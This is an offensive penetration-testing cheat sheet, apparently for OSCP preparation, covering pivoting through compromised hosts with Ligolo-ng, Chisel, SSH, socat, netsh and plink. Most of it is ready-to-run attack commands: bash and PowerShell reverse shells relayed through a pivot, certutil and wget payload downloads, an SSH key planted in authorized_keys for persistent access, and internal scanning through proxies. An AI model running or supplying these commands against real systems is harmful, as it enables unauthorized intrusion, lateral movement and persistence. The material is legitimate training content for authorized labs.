# Pivoting and Port Forwarding Methodology

> *Operational Workflow: Dual-Homed Host Discovery (Phase 1) -> Localhost Service Access (Phase 2) -> Tool Selection & Tunnel Establishment (Phase 3) -> Multi-Hop & Double Pivoting (Phase 4) -> File Transfers Across Boundaries (Phase 5) -> Reverse Shell Relaying (Phase 6) -> Troubleshooting & Operational Checklist (Phase 7-8)*
> *Essential Cheatsheets: [[🔀 ligolo-chisel|Ligolo & Chisel]], [[🐧 linux-commands|Linux Commands]], [[🪟 windows-commands|Windows Commands]], [[🐢 reverse-shells|Reverse Shells]], [[🔧 impacket|Impacket]]*

---

# Phase 0: Pivoting Concepts and Comparative Architecture

> *Pivoting describes the operational technique of utilizing a compromised host (the "Pivot") to route network traffic into isolated internal subnets that are otherwise unreachable by the attacker's machine.*

### Port Forwarding vs SOCKS Proxying vs Full TUN Tunneling

```text
1. PORT FORWARDING (Static 1-to-1 Mapping)
   [ Kali: 127.0.0.1:8080 ] ──────> [ Pivot Host ] ──────> [ Internal Host: 80 ]
   - Best for: Accessing a single specific service (e.g., internal web app, database).

2. SOCKS PROXYING (Dynamic L4 Application Proxy)
   [ Kali Tools (proxychains) ] ───> [ SOCKS Proxy: 1080 ] ───> [ Any Internal Host / Port ]
   - Best for: Application-layer scanning and multi-host enumeration when TUN is unavailable.

3. FULL TUN TUNNELING (Transparent L3 VPN Routing)
   [ Kali Network Stack (tun0) ] ═══> [ Encrypted Tunnel ] ═══> [ Isolated Internal Subnet ]
   - Best for: Seamless routing of all TCP traffic, full Nmap capabilities, and direct routing.
```

### Comparative Analysis of Pivoting Approaches

| Pivoting Approach | Primary Tool Suite | Protocol Layer | Transparent Routing | Tool Compatibility | OSCP Exam Suitability |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **TUN Tunneling** | **Ligolo-ng** | Layer 3 (Network) | Yes (via OS routing table) | Full native tools (Nmap, Evil-WinRM, Metasploit) | **Top Recommendation** (Fastest and cleanest) |
| **SOCKS Proxying** | **Chisel**, **SSH (`-D`)** | Layer 4/5 (Transport/Session) | No (Requires `proxychains`) | Limited to TCP apps supporting proxies | High (Fallback for restricted environments) |
| **Port Forwarding** | **SSH (`-L`/`-R`)**, **Socat**, **Netsh** | Layer 4 (Transport) | Point-to-Point only | Direct connection to mapped local port | High (Fastest for single services) |
| **VPN Proxying** | **Sshuttle** | Layer 3/4 (IPTables redirect) | Yes (Transparent to TCP) | Standard TCP tools (Linux pivot only) | Medium (Requires Python on pivot) |

### Typical OSCP Dual-Homed Network Topology

```text
[ Kali Linux Attacker ] ── VPN (192.168.45.X) ──> [ Dual-Homed DMZ Pivot ] ── Internal Subnet ──> [ Isolated Target ]
  Kali IP: 192.168.45.50                            External IP: 192.168.45.10                        Internal IP: 10.10.10.20
                                                    Internal IP: 10.10.10.10
```

- **Firewall Restrictions**: Modern environments block direct inbound connections from external subnets to internal hosts. However, **outbound traffic** from the Pivot to Kali is frequently permitted.
- **Reverse Tunnels**: Reverse proxies (where the compromised pivot connects back to a listener on Kali) reliably bypass inbound perimeter firewall filters.

---

# Pivoting Attack Vector Triage Matrix

> *Operational Triage: Select the appropriate pivoting technique based on pivot operating system, available privileges, network access, and operational requirements.*

| Discovered Scenario / Access Level | Recommended Pivoting Technique | Methodology Section |
| :--- | :--- | :--- |
| Service bound strictly to `127.0.0.1` on compromised host | Localhost Port Forwarding | [[#Phase 2: Accessing Localhost Services (127.0.0.1) from Low-Priv Shell]] |
| Dual-homed pivot / Need full subnet access without proxychains | Ligolo-ng Transparent TUN Interface | [[#3.1: Ligolo-ng (Recommended Industry Standard)]] |
| Restricted pivot / Outbound HTTP permitted / Need SOCKS proxy | Chisel Reverse SOCKS5 Tunneling | [[#3.2: Chisel (HTTP-Encapsulated Multiplexed Tunneling)]] |
| Linux pivot with valid SSH credentials / Need quick access | SSH Local, Remote, or Dynamic Forwarding | [[#3.3: SSH Port Forwarding and Tunneling]] |
| Linux pivot with SSH & Python / Transparent TCP routing | Sshuttle VPN-like IPTables Proxy | [[#3.4: Sshuttle (Transparent SSH VPN for Linux)]] |
| Need fast port redirection or reverse shell relay on Linux | Socat Bidirectional Relay | [[#3.5: Socat (Versatile Bidirectional Socket Relaying)]] |
| Windows pivot with Administrator privileges / No tools allowed | Windows Native Netsh Portproxy | [[#3.6: Windows Native Netsh Portproxy]] |
| Windows pivot with outbound SSH access to Kali | Plink.exe SSH Remote Forwarding | [[#3.7: Plink.exe (PuTTY Command-Line SSH for Windows)]] |
| Multiple isolated network hops (Pivot 1 -> Pivot 2 -> Target) | Multi-Hop Double Pivoting | [[#Phase 4: Multi-Hop and Double Pivoting]] |
| Need to transfer files from Kali to internal target | Boundary File Staging via Pivot | [[#Phase 5: File Transfers Across Network Boundaries]] |
| Internal host shell must reach Kali listener | Reverse Shell Relaying Across Pivot | [[#Phase 6: Reverse Shell Relaying Across Network Boundaries]] |

---

# Phase 1: Dual-Homed Host Discovery and Internal Reconnaissance

> *Execute these discovery commands immediately upon landing a foothold to determine if the compromised system connects to secondary internal subnets.*

### 1.1: Network Interface Enumeration

```bash
# Linux: Identify all network interfaces and assigned IP ranges
ip -br a
ip addr show
ifconfig
```

```cmd
:: Windows: Enumerate network adapters and IPv4 configurations
ipconfig /all
powershell -ep bypass -Command "Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixLength"
```
> 💡 *Inspect outputs for secondary interfaces matching `10.x.x.x`, `172.16.x.x - 172.31.x.x`, or `192.168.x.x` that differ from your initial Kali access subnet.*

### 1.2: Routing Table and Gateway Identification

```bash
# Linux: Review kernel routing tables and default gateways
ip route
route -n
netstat -rn
```

```cmd
:: Windows: Review persistent routes and active gateways
route print
powershell -ep bypass -Command "Get-NetRoute -AddressFamily IPv4 | Select-Object DestinationPrefix, NextHop, InterfaceAlias"
```

### 1.3: Neighbor and ARP Cache Discovery

```bash
# Linux: Inspect recently contacted neighbor devices
ip neigh
arp -a

# Fast unauthenticated ping sweep across /24 subnet from Linux pivot
for i in $(seq 1 254); do (ping -c 1 -W 1 10.10.10.$i | grep "from" &); done
```

```cmd
:: Windows: Inspect ARP cache table
arp -a

:: Fast ping sweep across /24 subnet from Windows pivot via PowerShell
powershell -ep bypass -Command "1..254 | ForEach-Object { $ip = '10.10.10.' + $_; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { Write-Host \"Host Discovered: $ip\" -ForegroundColor Green } }"
```

### 1.4: Active Sockets and Localhost Listening Services

```bash
# Linux: Identify services bound exclusively to 127.0.0.1
ss -tulpn
netstat -tulnp
```

```cmd
:: Windows: Identify services bound to localhost (127.0.0.1 / 0.0.0.0)
netstat -ano | findstr LISTENING
```

### 1.5: Name Resolution and Hosts Configuration

```bash
# Linux: Inspect static hostname mappings and internal DNS servers
cat /etc/hosts
cat /etc/resolv.conf
```

```cmd
:: Windows: Inspect static hosts mappings
type C:\Windows\System32\drivers\etc\hosts
```

---

# Phase 2: Accessing Localhost Services (127.0.0.1) from Low-Priv Shell

> *Operational Problem: A sensitive internal administrative interface, database daemon, or management API is bound strictly to `127.0.0.1:PORT` on the compromised target and is inaccessible externally.*

### Method 1: Direct In-Session HTTP Clients (Fastest)

If shell access is established, query the service directly without deploying additional tools:

```bash
# Query via curl
curl -s http://127.0.0.1:8080/
curl -s -X POST http://127.0.0.1:8000/api/admin -d "action=status"

# Query via wget
wget -qO- http://127.0.0.1:8080/login
```

### Method 2: SSH Local Port Forwarding (`-L`)

Forward the remote localhost port back to a local port on Kali:

```bash
# Syntax: ssh -L [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [USER]@[PIVOT_IP]
ssh -L 8080:127.0.0.1:8080 user@[PIVOT_IP]
# Open browser on Kali: http://127.0.0.1:8080
```

### Method 3: Chisel Reverse Port Forwarding

Deploy Chisel to forward the internal port back to Kali without SSH:

```bash
# Step 1: Start Chisel server on Kali
chisel server -p 9000 --reverse

# Step 2: Execute Chisel client on target to forward remote 8000 to Kali 8000
./chisel client [KALI_IP]:9000 R:8000:127.0.0.1:8000
# Access service on Kali: curl http://127.0.0.1:8000
```

### Method 4: Socat Localhost Forwarding

Bind a public port on the pivot to relay traffic into the localhost daemon:

```bash
# Expose localhost port 8080 on all interfaces on port 9999
socat TCP-LISTEN:9999,fork,reuseaddr TCP:127.0.0.1:8080 &
# Access from Kali: curl http://[PIVOT_IP]:9999/
```

### Method 5: Zero-Dependency Python TCP Relay Script

If no standalone binaries can be deployed, execute this in-memory Python socket relay:

```python
import socket, threading

def relay(src, dst):
    try:
        while True:
            data = src.recv(4096)
            if not data: break
            dst.sendall(data)
    except: pass
    src.close(); dst.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 9999))
s.listen(5)

while True:
    client_sock, _ = s.accept()
    target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_sock.connect(('127.0.0.1', 8080))
    threading.Thread(target=relay, args=(client_sock, target_sock)).start()
    threading.Thread(target=relay, args=(target_sock, client_sock)).start()
```

---

# Phase 3: Primary Pivoting and Tunneling Tool Suites

## 3.1: Ligolo-ng (Recommended Industry Standard)

> *Ligolo-ng creates a virtual TUN interface on Kali Linux, establishing transparent Layer 3 network routing into the internal subnet. It eliminates the need for `proxychains` and supports direct Nmap scans, browser navigation, and multi-service exploitation.*

### Architecture:
- **Proxy**: Runs on the attacker's Kali machine.
- **Agent**: Runs on the compromised pivot host (Windows or Linux).
- **Communication**: Encrypted TLS tunnel established from Agent to Proxy.

```text
[ Kali (Proxy) ] ─── tun0 (10.10.10.0/24) ═══ TLS (11601) ═══> [ Pivot (Agent) ] ───> [ 10.10.10.0/24 ]
```

### Step 1: Configure TUN Interface and Proxy on Kali Linux
```bash
# 1. Create a dedicated TUN device accessible by non-root users
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# 2. Add routing rule for the target internal subnet through the TUN interface
sudo ip route add [INTERNAL_SUBNET] dev ligolo
# Example: sudo ip route add 10.10.10.0/24 dev ligolo

# 3. Start the Ligolo-ng proxy listener
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Step 2: Execute Ligolo-ng Agent on the Pivot Host
```cmd
:: Windows Pivot Execution
agent.exe -connect [KALI_IP]:11601 -ignore-cert
```

```bash
# Linux Pivot Execution
chmod +x agent
./agent -connect [KALI_IP]:11601 -ignore-cert
```

### Step 3: Activate Session in Ligolo-ng Console (Kali)
```text
ligolo-ng » session
? Select a session: 1 - user@pivot (192.168.45.10)
[Session : user@pivot] » start
[+] Starting tunnel to user@pivot
```

### Step 4: Validate Direct Network Access from Kali
```bash
# Direct ICMP ping (if allowed by target firewall)
ping -c 2 [INTERNAL_IP]

# Direct Nmap TCP Connect scan (no proxychains needed!)
nmap -sT -Pn -p 21,22,80,443,445,3389,8080 [INTERNAL_IP]

# Direct web navigation or service interaction
curl http://[INTERNAL_IP]/
evil-winrm -i [INTERNAL_IP] -u [USER] -p '[PASS]'
```

### Step 5: Handling Reverse Shells Across Ligolo-ng (`listener_add`)
When an internal target sends a reverse shell, it cannot route to Kali directly. Configure the Ligolo agent to listen on the pivot and redirect incoming shells to Kali:

```text
# Inside the active Ligolo session console on Kali:
[Session : user@pivot] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
[+] Listener created on 0.0.0.0:4444 !

# Verify active listeners
[Session : user@pivot] » listener_list
```

```bash
# On Kali: Start standard Netcat listener
nc -nlvp 4444

# On the isolated internal target: Point reverse shell to the PIVOT'S internal IP
bash -i >& /dev/tcp/[PIVOT_INTERNAL_IP]/4444 0>&1
```

---

## 3.2: Chisel (HTTP-Encapsulated Multiplexed Tunneling)

> *Chisel is a high-performance TCP/UDP tunnel over HTTP, secured with SSH. It operates as a SOCKS5 proxy or static port forwarder, ideal for bypassing strict egress firewalls that permit only HTTP/HTTPS traffic.*

### Scenario A: Reverse SOCKS5 Proxy (Pivot connects to Kali - Recommended)
Use when the pivot cannot receive inbound connections from Kali.

```bash
# 1. Start Chisel server on Kali
chisel server -p 8000 --reverse

# 2. Execute Chisel client on Pivot (connects to Kali and opens SOCKS5 on Kali port 1080)
# Linux:
./chisel client [KALI_IP]:8000 R:socks
# Windows:
chisel.exe client [KALI_IP]:8000 R:socks
```

```bash
# 3. Configure /etc/proxychains4.conf on Kali:
# Comment out existing proxy lines and append:
# socks5 127.0.0.1 1080

# 4. Route commands through the established proxy:
proxychains nmap -sT -Pn -n [INTERNAL_IP]
proxychains evil-winrm -i [INTERNAL_IP] -u [USER] -p '[PASS]'
```

### Scenario B: Forward SOCKS5 Proxy (Kali connects to Pivot)
Use when inbound connections to the pivot are permitted.

```bash
# 1. Start Chisel server on Pivot
./chisel server -p 8000 --socks5

# 2. Connect from Kali as a client
chisel client [PIVOT_IP]:8000 socks
# Chisel opens local SOCKS5 proxy on 127.0.0.1:1080
```

### Scenario C: Static Reverse Port Forwarding (Single Service Mapping)
Forward a single internal service (e.g., MySQL on port 3306) to Kali:

```bash
# On Kali:
chisel server -p 8000 --reverse

# On Pivot: Map internal target's port 3306 to Kali's port 3306
./chisel client [KALI_IP]:8000 R:3306:[INTERNAL_IP]:3306

# On Kali: Connect directly to mapped port
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---

## 3.3: SSH Port Forwarding and Tunneling

> *Native OpenSSH functionality allows forwarding individual ports or establishing dynamic SOCKS proxies over encrypted SSH tunnels.*

### Deploying Public SSH Key to Low-Privilege Shell
If a shell on a Linux pivot lacks known SSH passwords, inject your SSH public key to enable SSH forwarding:

```bash
# 1. Generate dedicated temporary keypair on Kali
ssh-keygen -t rsa -b 2048 -f /tmp/pivot_key -N ""

# 2. Append public key to target authorized_keys via existing shell
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "PASTE_CONTENTS_OF_/tmp/pivot_key.pub" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### 1. Local Port Forwarding (`-L`)
Forward a remote port to Kali. 
*Syntax: `ssh -L [KALI_PORT]:[TARGET_IP]:[TARGET_PORT] [USER]@[PIVOT_IP]`*

```bash
# Example A: Access pivot's own internal web daemon (127.0.0.1:8080)
ssh -i /tmp/pivot_key -N -f -L 8080:127.0.0.1:8080 user@[PIVOT_IP]
# Access on Kali: http://127.0.0.1:8080

# Example B: Access an isolated internal machine's web server via the pivot
ssh -i /tmp/pivot_key -N -f -L 80:[INTERNAL_IP]:80 user@[PIVOT_IP]
# Access on Kali: http://127.0.0.1:80
```

### 2. Remote Port Forwarding (`-R`)
Forward a local Kali port to the remote pivot.
*Syntax: `ssh -R [PIVOT_PORT]:[KALI_IP]:[KALI_PORT] [USER]@[PIVOT_IP]`*

```bash
# Example A: Allow internal hosts to download payloads from Kali web server
ssh -i /tmp/pivot_key -N -f -R 80:127.0.0.1:80 user@[PIVOT_IP]
# Internal hosts execute: curl http://[PIVOT_INTERNAL_IP]:80/payload.exe -o payload.exe

# Example B: Relay incoming reverse shells back to Kali
ssh -i /tmp/pivot_key -N -f -R 4444:127.0.0.1:4444 user@[PIVOT_IP]
# Internal target executes: bash -i >& /dev/tcp/[PIVOT_INTERNAL_IP]/4444 0>&1
```

### 3. Dynamic Port Forwarding (`-D`)
Spawn a dynamic SOCKS4/SOCKS5 proxy on Kali to access entire internal subnets.
*Syntax: `ssh -D [LOCAL_SOCKS_PORT] [USER]@[PIVOT_IP]`*

```bash
# Spawn SOCKS proxy on port 1080 of Kali
ssh -i /tmp/pivot_key -N -f -D 1080 user@[PIVOT_IP]

# Configure /etc/proxychains4.conf with: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -n 10.10.10.0/24
```

### SSH Tunneling Flags Reference

| Flag | Operational Purpose |
| :--- | :--- |
| `-N` | Do not execute remote commands (establishes port forwarding only). |
| `-f` | Send SSH process to the background immediately before execution. |
| `-L` | Local port forward specification (`[LOCAL_PORT]:[HOST]:[PORT]`). |
| `-R` | Remote port forward specification (`[PIVOT_PORT]:[HOST]:[PORT]`). |
| `-D` | Dynamic application-level port forwarding (SOCKS proxy). |
| `-C` | Enable data compression (improves performance over slow links). |
| `-q` | Quiet mode (suppresses non-essential warnings). |

---

## 3.4: Sshuttle (Transparent SSH VPN for Linux)

> *Sshuttle acts as a transparent, automated VPN over an SSH connection using Linux IPTables. It requires root privileges on Kali and Python installed on the remote Linux pivot.*

```bash
# Transparently route internal subnet traffic through the pivot
sudo sshuttle -r user@[PIVOT_IP] [INTERNAL_SUBNET]

# Example with specific SSH private key
sudo sshuttle -r user@[PIVOT_IP] --ssh-cmd "ssh -i /tmp/pivot_key" 10.10.10.0/24
```
- Once established, all TCP traffic to `10.10.10.0/24` is automatically routed via the pivot without configuring proxychains.

---

## 3.5: Socat (Versatile Bidirectional Socket Relaying)

> *Socat establishes bidirectional byte streams between two network sockets. It is ideal for port redirection, relaying payloads, and funneling reverse shells through a pivot.*

```bash
# 1. Forward incoming traffic on Pivot port 8080 to Internal Target port 80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:[INTERNAL_IP]:80 &

# 2. Reverse Shell Relay: Listen on Pivot port 4444 and forward to Kali port 4444
socat TCP-LISTEN:4444,fork TCP:[KALI_IP]:4444 &

# 3. Expose Pivot Localhost service (127.0.0.1:8080) on external port 9090
socat TCP-LISTEN:9090,fork,reuseaddr TCP:127.0.0.1:8080 &
```

---

## 3.6: Windows Native Netsh Portproxy

> *Windows includes native TCP port forwarding capabilities via the `netsh interface portproxy` command. It requires local administrative privileges but requires zero third-party tools.*

```cmd
:: 1. Add TCP port forwarding rule: Pivot listens on 4444 and forwards to Kali port 4444
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=[KALI_IP]

:: 2. Ensure Windows Defender Firewall permits traffic on the listening port
netsh advfirewall firewall add rule name="PortProxy_4444" protocol=TCP dir=in localport=4444 action=allow

:: 3. Review all active portproxy mappings
netsh interface portproxy show all

:: 4. Delete portproxy rule post-engagement
netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0
```

---

## 3.7: Plink.exe (PuTTY Command-Line SSH for Windows)

> *Plink provides command-line SSH capabilities on Windows endpoints to establish remote port forwarding.*

```cmd
:: Connect back to Kali SSH server and forward Pivot port 4444 to Kali port 4444
echo y | plink.exe -ssh -l kali -pw "[KALI_SSH_PASS]" [KALI_IP] -R 4444:127.0.0.1:4444 -N
```

---

# Phase 4: Multi-Hop and Double Pivoting

> *Operational Context: Moving through multiple cascaded internal boundaries where Target B is accessible only from Pivot 2, and Pivot 2 is accessible only from Pivot 1.*

```text
[ Kali Linux ] ─── Tunnel 1 ───> [ Pivot Host 1 ] ─── Tunnel 2 ───> [ Pivot Host 2 ] ───> [ Target Machine ]
192.168.45.50                    192.168.45.10 / 10.10.10.10         10.10.10.20 / 172.16.20.20    172.16.20.50
```

### Method A: Chained SOCKS Proxies via Proxychains
```text
1. Establish SOCKS proxy on Kali port 1080 pointing through Pivot 1.
2. Through proxychains, run Chisel/SSH on Pivot 2 to open a second SOCKS proxy on Kali port 1081.
3. Configure /etc/proxychains4.conf in strict_chain mode:

[ProxyList]
socks5 127.0.0.1 1080    # First Hop: Pivot 1
socks5 127.0.0.1 1081    # Second Hop: Pivot 2
```

### Method B: Double Pivoting via Ligolo-ng
Ligolo-ng supports chained multi-hop environments by utilizing `listener_add` to relay the second agent's connection:

```text
1. Agent 1 on Pivot 1 connects back to Kali Ligolo Proxy. Route 10.10.10.0/24 added.
2. On Kali Ligolo console, add a listener on Pivot 1 to forward traffic to Kali:
   listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
3. Agent 2 on Pivot 2 connects to Pivot 1's internal IP:
   ./agent -connect 10.10.10.10:11601 -ignore-cert
4. Session 2 appears on Kali Ligolo console. Add route for 172.16.20.0/24:
   sudo ip route add 172.16.20.0/24 dev ligolo
5. Direct, transparent access to 172.16.20.50 is achieved!
```

---

# Phase 5: File Transfers Across Network Boundaries

> *Staging files across a pivot requires a deliberate two-stage transfer strategy: Stage 1 transfers tools to the pivot, while Stage 2 delivers tools from the pivot to the isolated internal target.*

```text
[ Kali Linux ] ──────── Stage 1 ────────> [ Pivot Host ] ──────── Stage 2 ────────> [ Isolated Target ]
```

### Stage 1: Transfer from Kali to Pivot
```bash
# Method A: HTTP Transfer from Kali
# Kali:
python3 -m http.server 80
# Pivot Linux:
wget http://[KALI_IP]/chisel -O /tmp/chisel && chmod +x /tmp/chisel
# Pivot Windows:
certutil -urlcache -f http://[KALI_IP]/chisel.exe C:\Temp\chisel.exe
powershell -ep bypass -Command "Invoke-WebRequest -Uri http://[KALI_IP]/chisel.exe -OutFile C:\Temp\chisel.exe"

# Method B: Impacket SMB Server (Windows Pivot)
# Kali:
impacket-smbserver share /opt/tools -smb2support
# Pivot Windows:
copy \\[KALI_IP]\share\agent.exe C:\Temp\agent.exe
```

### Stage 2: Transfer from Pivot to Internal Target
```bash
# Method A: Temporary HTTP Server Hosted on Pivot
# On Pivot Linux:
cd /tmp && python3 -m http.server 8111
# On Pivot Windows:
powershell -ep bypass -Command "python -m http.server 8111"

# From Isolated Target: Download from Pivot's internal IP
# Linux Target:
curl -s http://[PIVOT_INTERNAL_IP]:8111/exploit.sh -o /tmp/exploit.sh
# Windows Target:
certutil -urlcache -f http://[PIVOT_INTERNAL_IP]:8111/exploit.exe C:\Temp\exploit.exe
```

```powershell
# Method B: Domain-Joined Administrative SMB Shares (C$)
# Copy payload directly from Pivot to Target
copy C:\Temp\agent.exe \\[INTERNAL_IP]\C$\Temp\agent.exe
```

---

# Phase 6: Reverse Shell Relaying Across Network Boundaries

> *Isolated internal targets cannot route packets back to Kali's external IP address. The reverse shell MUST be addressed to the Pivot Host, which relays the connection to Kali.*

```text
[ Isolated Target ] ─── Shell ───> [ Pivot Host: 4444 ] ─── Relay ───> [ Kali Listener: 4444 ]
```

### Option 1: Ligolo-ng Listener (Recommended)
```text
# Inside active Ligolo console on Kali:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```
```bash
# Start Netcat listener on Kali:
nc -nlvp 4444

# Payload on isolated internal target points to PIVOT:
bash -i >& /dev/tcp/[PIVOT_INTERNAL_IP]/4444 0>&1
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('[PIVOT_INTERNAL_IP]',4444);..."
```

### Option 2: Socat Relay on Linux Pivot
```bash
# On Linux Pivot:
socat TCP-LISTEN:4444,fork TCP:[KALI_IP]:4444 &
```

### Option 3: Netsh Portproxy on Windows Pivot
```cmd
:: On Windows Pivot (Admin):
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=[KALI_IP]
```

---

# Phase 7: Operational Pitfalls and Troubleshooting

> [!WARNING]
> **Network Scanning and Protocol Caveats:**
> - **Nmap SYN Scans (`-sS`) Fail via SOCKS**: Raw socket manipulation is unsupported over SOCKS proxies. Always specify TCP Connect scans (`-sT`) and disable ping probes (`-Pn`).
> - **UDP Is Unsupported Over SOCKS**: Standard SOCKS4/SOCKS5 tunnels do not support UDP packets. Kerberos KDC, SNMP, and DNS queries over UDP will drop unless utilizing a transparent Layer 3 TUN tunnel (Ligolo-ng).
> - **DNS Resolution Hangs**: Use `-n` with Nmap to disable reverse DNS resolution over high-latency proxy chains.

> [!WARNING]
> **Performance and Stability Tuning:**
> - **Port Scope Reduction**: Scanning 65,535 ports through a proxy is prohibitively slow. Prioritize essential common service ports (`-p 21,22,80,443,445,1433,3306,3389,5985,8080`).
> - **Process Liveness**: If a tunnel terminates unexpectedly, verify the background agent process status (`ps aux | grep agent` or `tasklist | findstr chisel`).
> - **Interactive Desktop Requirements**: GUI-dependent payloads and token-stealing exploits may fail if executed outside an active interactive RDP desktop session.

---

# Phase 8: Quick Reference Pivoting Checklist

```text
=== PHASE 1: DUAL-HOMED RECONNAISSANCE ===
[ ] Check interfaces on pivot               -> ip -br a  OR  ipconfig /all
[ ] Identify secondary internal subnets     -> Look for 10.x, 172.16-31.x, 192.168.x
[ ] Inspect routing tables & default gateway -> ip route  OR  route print
[ ] Review ARP neighbor cache               -> arp -a  OR  ip neigh
[ ] Execute ping sweep across internal /24  -> Discover active IP hosts

=== PHASE 2: LOCALHOST SERVICE DISCOVERY ===
[ ] Identify listening services on pivot    -> ss -tulpn  OR  netstat -ano
[ ] Check for localhost-only services       -> Ports bound to 127.0.0.1
[ ] Forward localhost port to Kali          -> ssh -L / chisel / socat / python relay

=== PHASE 3: TUNNELING & PROXY SELECTION ===
[ ] Priority 1: Deploy Ligolo-ng            -> TUN interface, transparent routing
[ ] Priority 2: Deploy Chisel Reverse SOCKS -> When inbound traffic to pivot is blocked
[ ] Priority 3: Deploy SSH Port Forwarding  -> When SSH credentials or keys exist
[ ] Priority 4: Deploy Socat / Netsh Relay  -> When point-to-point forwarding suffices

=== PHASE 4: INTERNAL SUB-NET SCANNING ===
[ ] If using Ligolo-ng                      -> Direct: nmap -sT -Pn [INTERNAL_IP]
[ ] If using Chisel / SSH Dynamic           -> Proxychains: proxychains nmap -sT -Pn -n [INTERNAL_IP]
[ ] Limit scan scope to critical ports      -> -p 21,22,80,443,445,1433,3389,5985,8080

=== PHASE 5: PAYLOAD & REVERSE SHELL RELAYING ===
[ ] Stage payloads on pivot                 -> Host HTTP/SMB server on pivot host
[ ] Configure reverse shell relay on pivot  -> listener_add / socat / netsh portproxy
[ ] Point internal reverse shells to pivot  -> Target connects to PIVOT_INTERNAL_IP
```
